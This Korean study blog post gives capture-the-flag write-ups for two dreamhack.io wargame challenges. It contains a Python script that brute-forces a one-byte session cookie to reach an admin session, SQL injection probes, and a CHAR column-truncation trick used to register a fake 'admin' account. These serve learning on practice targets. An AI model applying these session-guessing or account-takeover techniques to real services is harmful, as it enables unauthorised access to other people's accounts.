---
layout: default
title: Day71
nav_order: 2

parent: Last Project
grand_parent: P4C
---

##### 해당 게시글은 스스로 공부하기 위한 게시글입니다.

-----

마지막으로 받은 과제는 다 끝내기로 스스로에게 약속했다.

# > dreamhack.io: session

## writeup

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG
}

session_storage = {
}

@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username]
        except:
            return '<script>alert("not found user");history.go(-1);</script>'
        if pw == password:
            resp = make_response(redirect(url_for('index')) )
            session_id = os.urandom(4).hex()
            session_storage[session_id] = username
            resp.set_cookie('sessionid', session_id)
            return resp 
        return '<script>alert("wrong password");history.go(-1);</script>'

if __name__ == '__main__':
    import os
    session_storage[os.urandom(1).hex()] = 'admin'
    print(session_storage)
    app.run(host='0.0.0.0', port=8000)
```

메인 함수부터 보았을 때 세션 저장소에 1byte 랜덤한 값을 인덱스로 정해서 "admin"을 넣는다. 예로 든다면 `session_storage[28]='admin'`이 되는 셈이다.

이후에 로그인하는 과정을 "guest" 계정으로 예를 들어본다면, 세션 저장소에 4btye 랜덤한 값을 인덱스로 정해서 "guest"를 넣는다. `session_storage[492612b2]='guest'` 이 되는 것이겠다.

그리고 인덱스 페이지에서 세션 저장소에 있는 값을 기준으로 사용자 이름을 불러오게 되는데, 이 때 전달되는 값을 `sessionid`라는 쿠키 값으로부터 가져온다. 즉, 세션 저장소에서 가져올 id의 정보를 사용자의 쿠키 조작을 통해 이루어지므로, 1byte 정도의 브루트 포싱은 도전해 볼만하지 않을까 생각한다.

![image-20220630180103795](../img/image-20220630180103795.png)

post 방식은 안되어 get으로 해보았다.

![image-20220630180550984](../img/image-20220630180550984.png)

![image-20220630180623319](../img/image-20220630180623319.png)

나이스! 아래는 사용한 코드이다.

```python
import requests

def my_request(num):
	url = "http://host3.dreamhack.games:20255/"
	cookie = {'sessionid':hex(num)[2:]}
	response = requests.get(url=url,cookies=cookie)
	return response


def solve():
	for num in range(0,256):
		response = my_request(num)
		if "admin" in response.text:
			print("Finally I get idx:",hex(num))
			break

if __name__ == "__main__":
	solve()
```

<br><br><br>

-------

# > dreamhack.io: tmitter

## 삽질

![image-20220630180921144](../img/image-20220630180921144.png)

db에 관한 정보만 던져주고 소스 코드에 대한 정보가 없다.

일일히 분석하는 방식으로 문제를 풀어야할 듯하다.

<br>

### 로그인

'Sign in' 버튼을 누르면 하찮게도 좌측 상단 위에 로그인 창이 뜬다.

![image-20220630200517620](../img/image-20220630200517620.png)

기본적인 sql injection을 시도했으나 "login fail" 알림창만이 발생한다. 아마도 필터링이 걸려있는 듯하다.



### 가입

![image-20220630200426066](../img/image-20220630200426066.png)

ID의 최소 길이는 4, PW의 최소 길이는 7로 알맞지 않으면 "chk id" 또는 "chk ps" 알림창이 발생한다.

![image-20220630200656048](../img/image-20220630200656048.png)

`' or 1#` 이런 id를 만든 다음 다시 생성을 시도하니 이미 존재한다는 문구가 나왔다. `'` 기호 앞에 이스케이프 문자가 들어가있는 것으로 봐서 아마도 `addslashes`와 같은 함수가 있는 듯하다.

### 로그인 이후

계정을 만들고나면 코멘트를 작성할 수 있는 공간과 로그아웃이 가능한 화면이 나온다.

그리고 코멘트에 내용을 작성하면 어떤 조건인지는 모르겠지만 가끔 "admin" 계정의 댓글이 달린다.

![image-20220630195952719](../img/image-20220630195952719.png)

혹시나 "admin" 계정이 해당 페이지에 접근하여 댓글을 남기는 걸까하고 생각을 하여  코멘트에 `<script>` 태그를 넣어봤었다. 하지만 기초적인 `alert`조차 발생하지 않는 것을 보니 XSS 풀이는 아닌 듯하다. 여기에 확신을 더하기 위해 쿠키값의 정보가 세션에 영향을 주는가 싶어 테스트를 해보았으나 전혀 반응이 없었다.



### 로그아웃

로그인 이후에 로그아웃 버튼을 눌렀다.

![image-20220630200316802](../img/image-20220630200316802.png)

`cmd` 파라미터에 'logout'이 찍히는 것을 보고 이것을 이용하나 싶어 다양한 것을 넣어보았다. 딱히 반응은 없다.

<br>

DB 테이블의 정보를 알려준 것이 힌트인 것 같아서 로그인 창 또는 가입 창에서 공격을 진행해야 할 것 같은데 방향성을 전혀 모르겠다. 댓글을 확인했는데 절반은 문제가 아쉽다는 내용이였고, 일부는 CHAR라는 문자만 달랑 남겨놓거나 글자를 어떻게 더 넣을지 생각해보면 된다는 힌트가 있었다. 

진짜 모르겠다. 하

<br>

![image-20220630202027827](../img/image-20220630202027827.png)

개발자 도구로 `join.php`를 읽다가 문제에서 주는 힌트를 주웠다. "admin"과 함께 가입을 할 필요가 있다고 한다.

![image-20220630202152770](../img/image-20220630202152770.png)

dreamhack에서 문제를 열었을 때 보이는 힌트와 종합해보면 login과 join을 함께 이용하여 로그인해야 할 듯하다.

<br>

## writeup

![image-20220630202503512](../img/image-20220630202503512.png)

풀.었.다.

댓글 힌트와 문제 힌트를 모두 종합하여 DB 특성을 생각해보았다. 

<br>

1.회원 가입 시 중복 검사 쿼리문의 구조가 어떻게 될까?  
내가 회원가입을 구현할 때와 마찬가지로 중복 검사를 진행할 터인데 이 때 `SELECT `문을 사용하는 게 일반적이라고 생각한다.  
그리고 `char` 형의 데이터가 비교될 때는 `varchar` 형과는 달리 길이가 다르다면 다른 것으로 취급한다.  
아래는 내가 php에서 어떤 쿼리를 날릴지 예상한 것이다.

````php
"SELECT * FROM tmitter_user WHERE id='{$_GET['id']}';"
````

<br>

2.로그인 시 쿼리문의 구조는 어떻게 될까?  
로그인은 검사를 하게 되면 id와 ps를 둘 다 비교할 것이다.  
이 때 `and` 조건을 통해서 id와 ps 모두 일치하는 것을 찾기 때문에, 혹여 동일한 "admin"의 id가 존재하더라도 ps의 값에 따라서 고유 idx값이 다른 "admin" 계정으로 로그인 될 것이다.  

```php
"SELECT * FROM tmitter_user WHERE id='{$_GET['id']}' and ps='{$_GET['ps']}';
```

<br>

3.회원 가입 시 쿼리문의 구조는 어떨까?  
앞서 회원 가입에서 중복 검사를 지나고 나면 `INSERT` 문으로 사용자 정보를 생성할 것 같았다.  
이 때 입력된 정보의 값이 컬럼을 정의할 때 설정한 데이터길이보다 더 많은 값을 넣는 것에 대한 검사가 없다고 가정해보자.  
만약 `id`의 값이 40자로 설정하여 쿼리문에 전달을 한다면, sql에서는 데이터 유형과 길이가 `char(32)`로 설정되어 있기 때문에 뒷 데이터를 짤라버린 채로 컬럼 값을 인식할 것이다.  

```php
"INSERT INTO tmitter_user (id,ps) values ("{$_GET['id']}","{$_GET['ps']}");
```

<br>

정리하자면 이렇다.

1. 가입 시 입력한 id와 ps에 대해서 id 중복 검사를 거친다.
2. 이 때 id에 40자리의 데이터를 전달하더라도 `char`형 특성상 데이터 길이가 다르면 다르다고 간주한다.
3. 중복 검사를 넘어 데이터가 등록될 때 컬럼에 정의된 데이터 길이보다 더 길 경우에는 `char`형 특성상 뒷 데이터를 자른다.
4. 중복된 아이디가 존재하더라도 id의 정보가 고유 키값이 아니기 때문에 동일한 아이디 생성에 제한이 없다.
5. 로그인 시 id와 ps 정보가 둘 다 일치하는 계정으로 로그인이 된다.
6. id가 "admin"인 경우로 트리거되는 이벤트가 존재한다면, 다른 idx이지만 id이름이 "admin"일 경우에도 트리거된다.

그래서 궁극적으로 회원 가입 시에 **id** 정보를 **"admin"+공백27자리+"aaaa"**, **ps**정보를 **"qwerqwer"**로 전달한다고 하자.

DB 상에는 id가 **"admin"+공백27자리** 이고, ps가 **"qwerqwer"**인 계정이 등록된다.

이후 로그인 시에 id에 **admin**, ps로 **"qwerqwer"** 전달하게 되면 "admin"으로 로그인이 된다.
